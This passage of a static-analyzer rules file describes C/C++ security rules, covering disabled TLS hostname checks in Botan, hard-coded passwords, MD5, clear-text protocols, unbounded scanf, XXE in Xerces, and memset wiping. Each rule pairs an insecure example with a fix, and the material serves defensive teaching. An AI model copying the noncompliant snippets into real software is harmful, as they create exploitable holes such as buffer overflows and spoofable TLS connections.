        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to\nuse the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks\n{\n    virtual void tls_verify_cert_chain(\n              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,\n              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,\n              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,\n              Botan::Usage_Type usage,\n              const std::string &amp;hostname,\n              const Botan::TLS::Policy &amp;policy)\n    override  { }\n};\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks { };\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = \"secret\"; // Sensitive\ndbi_conn_set_option(conn, \"password\", password.c_str());\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = getDatabasePassword(); // Compliant\ndbi_conn_set_option(conn, \"password\", password.c_str()); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "c:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"MD5\")); // Sensitive\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"SHA-512\")); // Compliant\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nchar* http_url = \"http://example.com\"; // Sensitive\nchar* ftp_url = \"ftp://anonymous@example.com\"; // Sensitive\nchar* telnet_url = \"telnet://anonymous@example.com\"; // Sensitive\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftp = curl_easy_init();\ncurl_easy_setopt(curl_ftp, CURLOPT_URL, \"ftp://example.com/\"); // Sensitive\n\nCURL *curl_smtp = curl_easy_init();\ncurl_easy_setopt(curl_smtp, CURLOPT_URL, \"smtp://example.com:587\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nchar* https_url = \"https://example.com\";\nchar* sftp_url = \"sftp://anonymous@example.com\";\nchar* ssh_url = \"ssh://anonymous@example.com\";\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftps = curl_easy_init();\ncurl_easy_setopt(curl_ftps, CURLOPT_URL, \"ftp://example.com/\");\ncurl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS\n\nCURL *curl_smtp_tls = curl_easy_init();\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_URL, \"smtp://example.com:587\");\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S1079": {
        "name": "\"scanf()\" and \"fscanf()\" format strings should specify a field width for the \"%s\" string placeholder",
        "htmlDesc": "<p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow\ncan occur.</p>\n<h2>Why is this an issue?</h2>\n<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters\ninto the buffer until they encounter a whitespace character.</p>\n<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being\noverwritten. This situation is known as a buffer overflow vulnerability.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application\ndata, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the\nexecution flow of the application, leading to arbitrary code execution.</p>\n<h2>How to fix it</h2>\n<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be\nread into the buffer.</p>\n<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large\nenough to hold the required input and the null terminator.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar buffer[10];\nscanf(\"%s\", buffer);  // Noncompliant\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and\n<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar buffer[10];\nscanf(\"%9s\", buffer);\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Xerces</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n#include \"xercesc/parsers/XercesDOMParser.hpp\"\n\nvoid parse() {\n  XercesDOMParser *DOMparser = new XercesDOMParser();\n  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant\n  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant\n\n  DOMparser-&gt;parse(xmlFile);\n}\n</pre>\n<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\n#include \"xercesc/sax2/SAX2XMLReader.hpp\"\n\nvoid parse() {\n  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();\n  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant\n\n  reader-&gt;parse(xmlFile);\n}\n</pre>\n<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\n#include \"xercesc/parsers/SAXParser.hpp\"\n\nvoid parse() {\n  SAXParser* SAXparser = new SAXParser();\n  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant\n\n  SAXparser-&gt;parse(xmlFile);\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>By default, <code>XercesDOMParser</code> is safe.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n#include \"xercesc/parsers/XercesDOMParser.hpp\"\n\nvoid parse() {\n  XercesDOMParser *DOMparser = new XercesDOMParser();\n  DOMparser-&gt;setCreateEntityReferenceNodes(true);\n  DOMparser-&gt;setDisableDefaultEntityResolution(true);\n\n  DOMparser-&gt;parse(xmlFile);\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\n#include \"xercesc/sax2/SAX2XMLReader.hpp\"\n\nvoid parse() {\n  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();\n  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);\n\n  reader-&gt;parse(xmlFile);\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\n#include \"xercesc/parsers/SAXParser.hpp\"\n\nvoid parse() {\n  SAXParser* SAXparser = new SAXParser();\n  SAXparser-&gt;setDisableDefaultEntityResolution(true);\n\n  SAXparser-&gt;parse(xmlFile);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "c:S5798": {
        "name": "\"memset\" should not be used to delete sensitive data",
        "htmlDesc": "<p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.\nThis ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this\npurpose.</p>\n<h2>Why is this an issue?</h2>\n<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is\nabout to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these\nwrite operations.</p>\n<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler\nmay see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>\n<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>\n<h2>How to fix it</h2>\n<p>The function <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The\nmain difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear\nsecurity-sensitive data.</p>\n<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;string.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operation, such as <a\nhref=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN\">SecureZeroMemory</a> (Windows)\nor <a href=\"https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero\">explicit_bzero</a> (FreeBSD).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset(password, 0, strlen(password));  // Noncompliant\n  memset(localToken, 0, strlen(localToken));  // Noncompliant\n  free(password);\n}\n</pre>\n<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go\nout of scope.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset_s(password, bufferSize, 0, strlen(password));\n  memset_s(localToken, sizeof(localToken), 0, strlen(localToken));\n  free(password);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> C++ reference - <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset</code>, <code>memset_s</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data\">Application Security\n  Verification Standard 4.0 - 8.3.6</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/14\">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "c:S1081": {
        "name": "Insecure functions should not be used",
